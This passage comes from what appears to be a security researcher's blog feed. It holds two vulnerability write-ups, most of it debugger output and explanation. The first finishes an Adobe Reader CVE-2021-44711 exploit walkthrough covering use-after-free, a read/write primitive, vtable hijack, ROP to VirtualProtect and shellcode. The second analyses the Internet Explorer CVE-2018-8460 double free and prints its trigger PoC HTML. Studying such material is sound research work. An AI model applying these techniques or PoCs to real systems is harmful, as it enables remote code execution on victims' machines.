07e21710  20000048 ffffff81 00000000 00000000
07e21720  00000000 00000000 00000000 00000000
07e21730  62334f7e 88000000
</code></pre></div></div>

<p>从相邻的Array对象内存布局可以看出每个Array对象以8个字节的数据隔开，因此当_obj占位于被释放的Array对象时，_obj[-1]正好访问的是上一个Array对象的0x1a：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 06e19250 - 0x30 L30
//_obj[-1]
06e19220  0000001a ffffff81 20000048 ffffff81
06e19230  00000000 00000000 00000000 00000000
06e19240  00000000 00000000 2922eb66 88000000
//_obj[0]
06e19250  00000000 0000000d 00000000 00000000
06e19260  00000000 ffffff84 00000000 ffffff84
06e19270  00000000 ffffff84 00000000 ffffff84
06e19280  00000000 ffffff84 00000000 00000000
06e19290  00000000 ffffff84 00000000 ffffff84
06e192a0  00000000 ffffff84 00000000 ffffff84
06e192b0  00000000 ffffff84 00000000 40000000
06e192c0  20000048 ffffff81 00000000 00000000
06e192d0  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>接着执行类型转换的函数可以看到当前this指针正好指向_obj[-1]，下断在free函数，传入的参数正是0x20000048：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 1 hit
eax=0015c0d4 ebx=06e19220 ecx=06e19220 edx=06e19220 esi=00000000 edi=06e19220
eip=705e89d1 esp=0015c0c4 ebp=0015c0f4 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
Annots!PlugInMain+0xaba1:
705e89d1 55              push    ebp
0:000&gt; dd ecx Lc
06e19220  0000001a ffffff81 20000048 ffffff81
06e19230  00000000 00000000 00000000 00000000
06e19240  00000000 00000000 2922eb66 88000000
0:000&gt; g
eax=20000048 ebx=06e19220 ecx=06e19220 edx=0000001a esi=00000000 edi=0015c0d4
eip=7436f7e0 esp=0015bf8c ebp=0015bf94 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
ucrtbase!free:
7436f7e0 8bff            mov     edi,edi
0:000&gt; dps esp L2
0015bf8c  705dd041 Annots+0x1d041
0015bf90  20000048		//free的内存地址
</code></pre></div></div>

<p>到这一步，漏洞已经从越界内存访问转变为了UAF，剩下的就是利用释放的内存构造读写原语了。</p>

<h2 id="任意内存读写原语的构造">任意内存读写原语的构造</h2>

<p>目前已经有一个被释放的0x1ffe大小的Array对象，因此用0xffe8大小的ArrayBuffer对象占位同一块内存。由于Array对象和ArrayBuffer对象表示长度属性的内存在同一位置，这样就导致了Array对象的长度被扩展为0xffe8，因此能够越界读写下一个临近Array对象的length值了：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 20000048 L10		//Array对象初始长度为0x1ffd
20000048  00000000 00001ffd 00001ffd 00001ffd
20000058  00000000 ffffff81 00000000 ffffff81
20000068  00000000 ffffff81 00000000 ffffff81
20000078  00000000 ffffff81 00000000 ffffff81
0:000&gt; dd 20000048 L10		//内存占用后长度为0xffe8
20000048  00000000 0000ffe8 07631450 00000000
20000058  41414141 ffffff81 00000000 00000000
20000068  00000000 00000000 00000000 00000000
20000078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>但是Array对象读写内存的能力不如ArrayBuffer，于是释放掉下一个临近的Array对象，并用ArrayBuffer对象占用内存，随后利用越界读写的Array对象修改ArrayBuffer对象的长度为0xffffff81：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:018&gt; dd 20000048+0x10000 L10
20010048  00000000 ffffff81 091910e0 00000000
20010058  41414141 ffffff81 00000000 00000000
20010068  00000000 00000000 00000000 00000000
20010078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>至此就获得了长度为0xffffff81的任意地址读写原语，不过该ArrayBuffer的起始地址为0x20010058，如果需要读写起始地址之前的数据，则必须将目的地址 + 0xffffffff + 1，得到的值再通过读写原语进行读写就可以成功写入了。</p>

<h2 id="代码执行">代码执行</h2>

<p>有了任意内存读写原语后，接下来就可以获取函数地址构造ROP链了。构造好后需要劫持对象的虚表实现，步骤如下：</p>

<ol>
  <li>获取任意内存读写原语的虚表地址</li>
  <li>修改虚表地址为ROP指令，进行栈置换</li>
  <li>修改shellcode内存属性为可读可写可执行</li>
  <li>跳转到shellcode执行，完成利用</li>
</ol>

<p>读写原语的虚表地址可以通过对象头的信息获取：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:014&gt; dd 20010048 L10
20010048  00000000 ffffff81 076910e0 00000000
20010058  41414141 ffffff81 00000000 00000000
20010068  00000000 00000000 00000000 00000000
20010078  00000000 00000000 00000000 00000000
0:014&gt; dps 076910e0 L4
076910e0  07627448
076910e4  07625ac0
076910e8  00000000
076910ec  674d9540 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xae630
0:014&gt; dps 07627448 L4
07627448  0763f628
0762744c  00000004
07627450  3affffff
07627454  00000040
0:014&gt; dps 0763f628 L4
0763f628  674d45e8 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xa96d8
0763f62c  07628090
0763f630  00000000
0763f634  06893c18
0:014&gt; dps 674d45e8 L8	//读写原语虚表
674d45e8  67429e18 EScript!double_conversion::DoubleToStringConverter::ToPrecision+0x3a0a8
674d45ec  9c000521
674d45f0  6727ad70 EScript!mozilla::HashBytes+0x9020
674d45f4  67363bb0 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9b870
674d45f8  6727ad70 EScript!mozilla::HashBytes+0x9020	//只需要修改该处的地址为ROP指令地址，即可实现虚表劫持
674d45fc  6727ad70 EScript!mozilla::HashBytes+0x9020
674d4600  6727ad70 EScript!mozilla::HashBytes+0x9020
674d4604  6727ad70 EScript!mozilla::HashBytes+0x9020
</code></pre></div></div>

<p>ROP指令则可以选择EScript+0x10539d处的指令，将栈地址迁移到0x5d000001。只需要在0x5d000001处填写好VirtualProtect的函数地址和对应的参数即可修改shellcode的内存属性为可执行，并跳转到shellcode执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:013&gt; g
Breakpoint 0 hit
eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
eip=6712539d esp=0034c3f8 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d05d:
6712539d bc0100005d      mov     esp,5D000001h
0:000&gt; p
eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
eip=671253a2 esp=5d000001 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d062:
671253a2 c3              ret
0:000&gt; dps esp L6
5d000001  75bd435f kernel32!VirtualProtect
5d000005  20010070 //shellcode
5d000009  20010058 
5d00000d  00000700
5d000011  00000040
5d000015  2001006c
</code></pre></div></div>

<p>不过在执行shellcode时发现普通的shellcode调用WinExec会执行失败，调试后发现执行到ZwCreateUserProcess时参数内有堆喷的垃圾数据，怀疑因为这些数据导致执行失败，更换shellcode为syscall执行ZwCreateUserProcess后成功调用。</p>

<p>该代码执行方式无法绕过CFG，最终在Windows7上完成了漏洞利用：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/44711.gif" alt="" /></p>

<h1 id="总结">总结</h1>

<p>该漏洞利用难点在于如何将漏洞从越界内存访问转化为UAF，后续的利用过程和其他同类型漏洞大同小异。在利用过程中也得到了文章作者李双师傅的帮助，学习到了Adobe漏洞的利用技巧。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 最近看到一篇Adobe Reader 漏洞 CVE-2021-44711 利用浅析漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。]]></summary></entry><entry><title type="html">CVE-2018-8460 IE 漏洞利用</title><link href="http://localhost:4000/2022-06-24/CVE-2018-8460" rel="alternate" type="text/html" title="CVE-2018-8460 IE 漏洞利用" /><published>2022-06-24T00:00:00+08:00</published><updated>2022-06-24T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-24/CVE-2018-8460</id><content type="html" xml:base="http://localhost:4000/2022-06-24/CVE-2018-8460"><![CDATA[<h1 id="前言">前言</h1>

<p>分析该漏洞的原因是看到ZDI的这篇分析文章：<a href="https://www.thezdi.com/blog/2018/10/18/cve-2018-8460-exposing-a-double-free-in-internet-explorer-for-code-execution">CVE-2018-8460: EXPOSING A DOUBLE FREE IN INTERNET EXPLORER FOR CODE EXECUTION</a>。里面详细分析了该漏洞的原理和利用思路，但是没有EXP，因此想尝试自己写出EXP。虽然最终没有成功写出EXP，但还是把学习的过程记录了下来，作为一个积累。<!--more--></p>

<h1 id="漏洞成因">漏洞成因</h1>

<p>poc如下：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Expires"</span> <span class="na">content=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;script&gt;</span>
	
<span class="kd">var</span> <span class="nx">iterationCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	
<span class="kd">function</span> <span class="nx">testcase</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">elm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">ins</span><span class="dl">'</span><span class="p">)</span>
<span class="nx">func</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">iterationCount</span><span class="o">++</span><span class="p">;</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nx">iterationCount</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                <span class="k">case</span> <span class="mi">12</span><span class="p">:</span>
                <span class="k">case</span> <span class="mi">22</span><span class="p">:</span>
                <span class="cm">/*case 34:*/</span>
                        <span class="k">this</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">cssText</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;</span><span class="dl">'</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nx">elm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMAttrModified</span><span class="dl">'</span><span class="p">,</span> <span class="nx">func</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span>
<span class="nx">elm</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">AAAAAAAAA</span><span class="dl">'</span>

<span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span>

<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">'testcase();'</span><span class="nt">&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>下断<code class="language-plaintext highlighter-rouge">MSHTML!CWritableCSSStyleDeclaration::put_cssText</code>，查看添加cssText后的结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=0413a7e0
eip=6bfb5de0 esp=0413a7d4 ebp=0413a7f8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CWritableCSSStyleDeclaration::put_cssText:
6bfb5de0 8bff            mov     edi,edi
0:007&gt; dps poi(esp+4) L7					//还未执行put_cssText，Style中为空
03cbe9c0  6bd3e8b4 MSHTML!CMSStyle::`vftable'
03cbe9c4  00000001
03cbe9c8  00000000
03cbe9cc  00000008
03cbe9d0  03c0cc00
03cbe9d4  00000000
03cbe9d8  0446aab0
0:007&gt; dd 03c0cc00 L8
03c0cc00  00000000 00000000 00000000 00000008
03c0cc10  00000000 00000000 00000000 00000000
0:007&gt; g
Breakpoint 0 hit
eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CWritableCSSStyleDeclaration::put_cssText:
6bfb5de0 8bff            mov     edi,edi
0:007&gt; dd 03c0cc00 L8						//第一次执行完后，Style中含有1个元素
03c0cc00  00000010 00000001 03cbea00 00114098
03c0cc10  00000000 00000000 00000000 00000000
0:007&gt; dd 03cbea00 L4
03cbea00  04090300 6be25b4c 00000001 0446b960
0:007&gt; g
Breakpoint 0 hit
eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CWritableCSSStyleDeclaration::put_cssText:
6bfb5de0 8bff            mov     edi,edi
0:007&gt; dd 03c0cc00 L8						//第二次执行完后，Style中含有11个元素
03c0cc00  00000034 0000000b 03cb4f70 0102c878
03c0cc10  04d501e0 00000002 00000000 00000000
0:007&gt; dd 03cb4f70 Lb*4
03cb4f70  04091400 6be39068 00000001 0000000f
03cb4f80  0409140a 6be39068 00000001 0000000f
03cb4f90  04091400 6be39140 00000001 0000000f
03cb4fa0  0409140a 6be39140 00000001 0000000f
03cb4fb0  04090300 6be25b4c 00000004 005700e4
03cb4fc0  0409030a 6be25b4c 00000001 6bd8aca8
03cb4fd0  04090300 6be25c58 00000002 03020c04
03cb4fe0  0409030a 6be25c58 00000002 00000000
03cb4ff0  84081f0a 8001140b 04d5cc68 04d5cc68
03cb5000  808c1f0a 8001140b 04d5cd10 00000006
03cb5010  84081f0a 8001140b 04d5cca0 04d5ccca
0:007&gt; du 04d5cc68 							//输入的cssText
04d5cc68  "char strict auto auto"
0:007&gt; du 04d5cd10 
04d5cd10  "none fixed 49cp auto"
0:007&gt; du 04d5cca0 
04d5cca0  "char strict auto auto"
0:007&gt; g
Breakpoint 0 hit
eax=6bd3e8b4 ebx=03056320 ecx=6bfb5de0 edx=00000000 esi=6bfb5de0 edi=04139738
eip=6bfb5de0 esp=0413972c ebp=04139750 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CWritableCSSStyleDeclaration::put_cssText:
6bfb5de0 8bff            mov     edi,edi
0:007&gt; dd 03c0cc00 L8						//第三次执行完，Style中含有7个元素
03c0cc00  00000024 00000007 03cbce10 00bdc648
03c0cc10  04d501e0 00000002 00000000 00000000
0:007&gt; dd 03cbce10 L7*4
03cbce10  04091400 6be39068 00000001 0000000f
03cbce20  04091400 6be39140 00000001 0000000f
03cbce30  04090300 6be25b4c 00000001 6ce7d8e4
03cbce40  04090300 6be25c58 00000003 03020c04
03cbce50  0409030a 6be25c58 00000002 00000000
03cbce60  808c1f0a 8001140b 04d5cc68 6ce7d988
03cbce70  84081f0a 8001140b 04d5cca0 04d5ccca
0:007&gt; du 04d5cc68 							//cssText
04d5cc68  "none fixed 49cp auto"
0:007&gt; du 04d5cca0 
04d5cca0  "char strict auto auto"
0:007&gt; g
Breakpoint 1 hit
eax=04139704 ebx=1f9d2224 ecx=03c0cc00 edx=04139494 esi=800113eb edi=00000000
eip=6bd64cb8 esp=041394e4 ebp=04139654 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CAttrArray::Free:
6bd64cb8 8bff            mov     edi,edi
0:007&gt; g
Breakpoint 1 hit
eax=03bf8000 ebx=00000006 ecx=03c0cc00 edx=00000000 esi=04139704 edi=03c0c160
eip=6bd64cb8 esp=0413948c ebp=041394d8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CAttrArray::Free:
6bd64cb8 8bff            mov     edi,edi
0:007&gt; g
Breakpoint 1 hit
eax=00000000 ebx=03cb83e0 ecx=03cb83e0 edx=00000005 esi=03cb83e0 edi=ffffffff
eip=6bd64cb8 esp=0413c1e4 ebp=0413c1f4 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CAttrArray::Free:
6bd64cb8 8bff            mov     edi,edi
0:007&gt; dd 03c0cc00 L8						//经过第四次put_cssText后，Style中含有10个元素
03c0cc00  00000034 0000000a 03cb5040 00e04748
03c0cc10  04d501e0 00000002 00000000 00000000
0:007&gt; dd 03cb5040 La*4
03cb5040  04091400 6be39068 00000002 0000000f
03cb5050  0409140a 6be39068 00000001 0000000f
03cb5060  04091400 6be39140 00000002 0000000f
03cb5070  0409140a 6be39140 00000001 0000000f
03cb5080  04090300 6be25b4c 00000001 6ce7d8e4
03cb5090  04090300 6be25c58 00000002 03020c04
03cb50a0  808c1f0a 8001140b 04d5cc68 00000006
03cb50b0  808c1f0a 8001140b 04d5cd10 6ce7d988
03cb50c0  84081f0a 8001140b 04d5cca0 04d5ccca	//第9个和第10个元素指向同一个字符串
03cb50d0  84081f0a 8001140b 04d5cca0 04d5ccca
0:007&gt; du 04d5cc68 
04d5cc68  "none fixed 49cp auto"
0:007&gt; du 04d5cd10 
04d5cd10  "none fixed 49cp auto"
0:007&gt; du 04d5cca0 
04d5cca0  "char strict auto auto"
0:007&gt; du 04d5cca0 
04d5cca0  "char strict auto auto"
</code></pre></div></div>

<p>经过四次put_cssText后，Style中含有两个指向相同cssText的元素，在后续执行<code class="language-plaintext highlighter-rouge">location.reload();</code>时，会清理当前文档的所有元素，此时<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>准备释放的就是elm对象:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; g
Breakpoint 1 hit
eax=0020fd78 ebx=02f355b0 ecx=02f1db70 edx=00f22e01 esi=02f1db70 edi=02f355c0
eip=6d1d4cb8 esp=035dc0ec ebp=035dc0fc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MSHTML!CAttrArray::Free:
6d1d4cb8 8bff            mov     edi,edi
0:008&gt; dps poi(esp+4) L10						//当前释放的AttrArray就是elm
02f37b80  6d2e1e34 MSHTML!CPhraseElement::`vftable'
02f37b84  00008000
02f37b88  00000000
02f37b8c  00000011
02f37b90  02f1db70
02f37b94  00000000
02f37b98  00000000
02f37b9c  00000000
02f37ba0  0000003f
02f37ba4  02000400
02f37ba8  80020e00
02f37bac  00020044
02f37bb0  02f328a0
02f37bb4  00000000
02f37bb8  00000000
02f37bbc  00000000
0:008&gt; dd 02f1db70 L4
02f1db70  00000018 00000005 02f35560 0041faf0	//AttrArray
0:008&gt; dd 02f35560 L5*4							
02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
02f355a0  80001a04 800113f3 02f377c0 02f37800
0:008&gt; du 04274ab0 
04274ab0  "AAAAAAAAA"
0:008&gt; du poi(02f35620+24)
0426a13c  "class"
0:008&gt; du poi(02f355c0+24)
0426a19c  "style"
0:008&gt; dd 05b223e0 L4
05b223e0  00000034 0000000a 02f7bd40 00e04748
0:008&gt; dd 02f7bd40 La*4
02f7bd40  04091400 6d2a9068 00000002 0000000f
02f7bd50  0409140a 6d2a9068 00000001 0000000f
02f7bd60  04091400 6d2a9140 00000002 0000000f
02f7bd70  0409140a 6d2a9140 00000001 0000000f
02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
02f7bd90  04090300 6d295c58 00000002 00ef0c04
02f7bda0  808c1f0a 8001140b 04284340 00000006
02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
02f7bdc0  84081f0a 8001140b 042843e8 04284412	//重复的字符串
02f7bdd0  84081f0a 8001140b 042843e8 04284412
</code></pre></div></div>

<p>随后<code class="language-plaintext highlighter-rouge">CAttrArray::Free</code>内部会执行memmove移动AttrArray，并执行<code class="language-plaintext highlighter-rouge">ProcessHeapFree</code>释放各个结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
eax=02f35570 ebx=02f1db70 ecx=02f35560 edx=00f22e01 esi=02f35570 edi=035dc0e8
eip=6d7fcc91 esp=035dc0bc ebp=035dc0e8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MSHTML!CAttrArray::Free+0x84:
6d7fcc91 ff15d4b1406e    call    dword ptr [MSHTML!_imp__memmove (6e40b1d4)] ds:002b:6e40b1d4={msvcrt!memmove (75a49e5a)}
0:008&gt; dd 02f35560 L5*4
02f35560  80001f00 800103e9 04274ab0 035db400	//className = 'AAAAAAAAA'
02f35570  80000d09 800103e9 02f35620 02f35620	//Attribute:class
02f35580  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
02f35590  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
02f355a0  80001a04 800113f3 02f377c0 02f37800
0:008&gt; pc
eax=0000001f ebx=02f1db70 ecx=04274ab0 edx=00000000 esi=02f35570 edi=035dc0e8
eip=6d221ae4 esp=035dc0c8 ebp=035dc0e8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CAttrArray::Free+0xfd:
6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
0:008&gt; dd 02f35560 L5*4
02f35560  80000d09 800103e9 02f35620 02f35620	//Attribute:class
02f35570  80000d09 800103eb 02f355c0 02f355c0	//Attribute:style
02f35580  80008005 800113f2 05b223e0 ee3dfb3f	//style.cssText
02f35590  80001a04 800113f3 02f377c0 02f37800
02f355a0  80001a04 800113f3 02f377c0 02f37800
0:008&gt; dps poi(esp) La							//要释放Attribute:style
02f355c0  6d1877a4 MSHTML!CAttribute::`vftable'
02f355c4  00000001
02f355c8  00000000
02f355cc  00000008
02f355d0  00000000
02f355d4  00000000
02f355d8  00000000
02f355dc  00000000
02f355e0  ffffffff
02f355e4  0426a19c
</code></pre></div></div>

<p>当外层的elm都释放完毕后，开始释放内部的elm.style.cssText：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
eax=00000000 ebx=02f1db70 ecx=05b223e0 edx=00000000 esi=05b223e0 edi=035dc0e8
eip=6d221aff esp=035dc0b0 ebp=035dc0bc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSHTML!CAttrArray::`scalar deleting destructor'+0xc:
6d221aff e8b431fbff      call    MSHTML!CAttrArray::Free (6d1d4cb8)
0:008&gt; dd 02f35560 L5*4								//此时外部的elm全部被释放
02f35560  80001a04 800113f3 02f377c0 02f37800
02f35570  80001a04 800113f3 02f377c0 02f37800
02f35580  80001a04 800113f3 02f377c0 02f37800
02f35590  80001a04 800113f3 02f377c0 02f37800
02f355a0  80001a04 800113f3 02f377c0 02f37800
0:008&gt; dd 05b223e0 L4								//还未被释放的elm.style.cssText
05b223e0  00000034 00000009 02f7bd40 00000008		
0:008&gt; dd 02f7bd40 La*4
02f7bd40  04091400 6d2a9068 00000002 0000000f
02f7bd50  0409140a 6d2a9068 00000001 0000000f
02f7bd60  04091400 6d2a9140 00000002 0000000f
02f7bd70  0409140a 6d2a9140 00000001 0000000f
02f7bd80  04090300 6d295b4c 00000001 6e2ed8e4
02f7bd90  04090300 6d295c58 00000002 00ef0c04
02f7bda0  808c1f0a 8001140b 04284340 00000006
02f7bdb0  808c1f0a 8001140b 04284458 6e2ed988
02f7bdc0  84081f0a 8001140b 042843e8 04284412
02f7bdd0  84081f0a 8001140b 042843e8 04284412
0:008&gt; 
eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
eip=6d221ae4 esp=035dc088 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!CAttrArray::Free+0xfd:
6d221ae4 e8ddb4f8ff      call    MSHTML!ProcessHeapFree (6d1acfc6)
0:008&gt; dd 02f7bd40 La*4								//执行许多memmove后，开始释放cssText内部的字符串
02f7bd40  808c1f0a 8001140b 04284458 6e2ed988
02f7bd50  84081f0a 8001140b 042843e8 04284412
02f7bd60  84081f0a 8001140b 042843e8 04284412
02f7bd70  84081f0a 8001140b 042843e8 04284412
02f7bd80  84081f0a 8001140b 042843e8 04284412
02f7bd90  84081f0a 8001140b 042843e8 04284412
02f7bda0  84081f0a 8001140b 042843e8 04284412
02f7bdb0  84081f0a 8001140b 042843e8 04284412
02f7bdc0  84081f0a 8001140b 042843e8 04284412
02f7bdd0  84081f0a 8001140b 042843e8 04284412
</code></pre></div></div>

<p>此时可以清晰的看到，由于之前cssText中存在两个指向相同字符串的元素，因此在释放时会将同一个字符串释放两次，触发了漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; t
eax=0000001f ebx=05b223e0 ecx=04284340 edx=00000000 esi=02f7bd50 edi=035dc0a8
eip=6d1acfc6 esp=035dc084 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!ProcessHeapFree:
6d1acfc6 8bff            mov     edi,edi
0:008&gt; pc
eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284340 esi=02f7bd50 edi=035dc0a8
eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!ProcessHeapFree+0xb:
6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
0:008&gt; du poi(esp)								//准备释放第一个cssText
04284340  "none fixed 49cp auto"
0:008&gt; pc
eax=0000001f ebx=05b223e0 ecx=003f0000 edx=04284458 esi=02f7bd50 edi=035dc0a8
eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!ProcessHeapFree+0xb:
6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
0:008&gt; du 04284340								//第一个cssText被释放
04284340  "Æone fixed 49cp auto"
0:008&gt; du poi(esp) 								//准备释放第二个cssText
04284458  "none fixed 49cp auto"
0:008&gt; pc
eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!ProcessHeapFree+0xb:
6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
0:008&gt; du 04284458								//第二个cssText被释放
04284458  ".one fixed 49cp auto"				
0:008&gt; du poi(esp)								//准备释放第三个cssText
042843e8  "char strict auto auto"
0:008&gt; pc
eax=0000001f ebx=05b223e0 ecx=003f0000 edx=042843e8 esi=02f7bd50 edi=035dc0a8
eip=6d1acfd1 esp=035dc080 ebp=035dc0a8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MSHTML!ProcessHeapFree+0xb:
6d1acfd1 e8b4558e00      call    MSHTML!MemoryProtection::HeapFree (6da9258a)
0:008&gt; du 042843e8								//此时第三个cssText已经被释放
042843e8  ".溜"
0:008&gt; du poi(esp)								//但是继续释放同一个内存，此时继续则会触发双重释放
042843e8  ".溜"
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="简化poc">简化POC</h2>

<p>经过最终简化后的POC为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;head&gt;
        &lt;meta http-equiv="Expires" content="-1"&gt;
&lt;head&gt;
&lt;script&gt;
	
function testcase() {
elm = document.createElement('ins')
func = function(e) {
    this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
}
elm.addEventListener('DOMAttrModified', func, true)
